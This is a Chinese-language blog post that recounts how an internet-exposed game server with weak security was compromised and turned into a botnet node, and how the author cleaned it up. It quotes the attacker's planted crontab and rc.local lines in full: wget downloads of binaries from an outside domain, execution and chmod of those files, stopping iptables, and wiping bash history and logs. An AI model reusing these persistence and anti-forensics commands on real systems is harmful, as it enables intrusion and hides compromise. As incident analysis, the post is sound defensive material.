---
layout: post
title: "记一次服务器被黑了"
description: ""
category: linux
tags: []
---
{% include JB/setup %}

有一个本地服，部署着游戏。我们称作‘本地服’。由于是本地，大家都是自己人，服务器安全防护的都关闭了。 密码123，iptables -F，selinux干掉，chmod都是777.   
呵呵，有一天老板突发奇想说想在家玩玩游戏，网管哥就在路由那里绑定，把服务器暴露出去了。。。 一直没留意。    
	
直到一天，全公司网络都非常慢，排查一下，发现199发包很猛，ssh登陆失败，密码被篡改了。才想起。。。。哦！服务器被黑了。


先把网线，让公司网络恢复先。进去机房，用单用户模式进去把服务器密码改回来。

上面没什么有价值的东西，不太造成损失。 （上面都是编译好了的端，没源码）于是乎开始服务器上寻找蛛丝马迹。     

思路一：先找出入侵者做过什么   
看看bash操作日志 `root@server199:~# cat -n .bash_history`  ，可惜被清空了。   

思路二：入侵者会留下什么  
我先想起定时任务，crontab -l  ,出现了一堆注释。我原本游戏是有定时任务的，被填入这么多注释，想必也是把操作隐藏在茫茫多的注释里面。
我把操作都找了出来。   
	
	*/101 * * * * cd /etc; wget http://www.dgnfd564sdf.com:8080/sksapd
	*/101 * * * * cd /etc; wget http://www.dgnfd564sdf.com:8080/skysapd 
	*/1 * * * * killall -9 new6
	*/1 * * * * killall -9 new4
	*/1 * * * * cd /etc; rm -rf dir sksapd.*
	*/1 * * * * cd /etc; rm -rf dir skysapd.*
	*/99 * * * * cd /root > .bash_history
	*/1 * * * * chmod 7777 /etc/sksapd
	*/1 * * * * chmod 7777 /etc/skysapd
	*/99 * * * * killall -9 cupsdd
	*/1 * * * * killall -9 node24
	*/98 * * * * killall -9 ksapd
	*/96 * * * * killall -9 kysapd
	*/96 * * * * killall -9 atdd
	*/1 * * * * chmod 7777 /etc/cupsdd
	*/1 * * * * chmod 7777 /etc/ksapd
	*/1 * * * * chmod 7777 /etc/kysapd
	*/96 * * * * killall -9 sksapd
	*/96 * * * * killall -9 skysapd
	*/1 * * * * chmod 7777 /etc/atdd
	*/1 * * * * /etc/init.d/iptables stop
	*/1 * * * * nohup /etc/cupsdd > /dev/null 2>&1&
	*/99 * * * * cd /etc;./ksapd
	*/97 * * * * cd /etc;./kysapd
	*/97 * * * * cd /etc;./atdd
	*/69 * * * * cd /etc; wget http://www.dgnfd564sdf.com:8080/cupsdd 
	*/97 * * * * cd /etc;./sksapd
	*/97 * * * * cd /etc;./skysapd
	*/79 * * * * cd /etc; wget http://www.dgnfd564sdf.com:8080/ksapd
	*/89 * * * * cd /etc; wget http://www.dgnfd564sdf.com:8080/kysapd
	*/99 * * * * cd /etc; wget http://www.dgnfd564sdf.com:8080/atdd
	*/1 * * * * cd /etc; rm -rf dir cupsdd.*
	*/1 * * * * cd /etc; rm -rf dir kysapd.*
	*/1 * * * * cd /etc; rm -rf dir ksapd.*
	*/1 * * * * cd /etc; rm -rf dir atdd.*
	*/1 * * * * killall -9 freeBSD
	*/1 * * * * history -c
	*/15 * * * * cd /var/log > secure


好吧，很明显的了，是被人做肉鸡了，定时下个skysapd什么的，执行。

同时在/etc/rc.local里没发现

	nohup /etc/cupsdd > /dev/null 2>&1&
	cd /etc;./ksapd
	cd /etc;./kysapd
	cd /etc;./atdd
	nohup /etc/cupsdd > /dev/null 2>&1&
	cd /etc;./ksapd
	cd /etc;./kysapd
	cd /etc;./atdd
	nohup /etc/cupsdd > /dev/null 2>&1&
	cd /etc;./ksapd
	cd /etc;./kysapd
	cd /etc;./atdd
	nohup /etc/cupsdd > /dev/null 2>&1&
	cd /etc;./ksapd
	cd /etc;./kysapd
	cd /etc;./atdd

把东西都干掉，撤销外网。以前就继续用了。后来用`last`命令看了一下，有两个登陆ip。把脚本的域名也查了一下。   
结果如下，便没有继续追寻下去了。   

您的IP查询为：122.224.34.42   
电脑IP地址查询详细位置：浙江省绍兴市 电信  


您的IP查询为：1.82.228.218  
电脑IP地址查询详细位置：陕西省西安市  


您的IP查询为：60.180.156.102  
电脑IP地址查询详细位置：浙江省温州市 (龙湾区)电信  
-EOF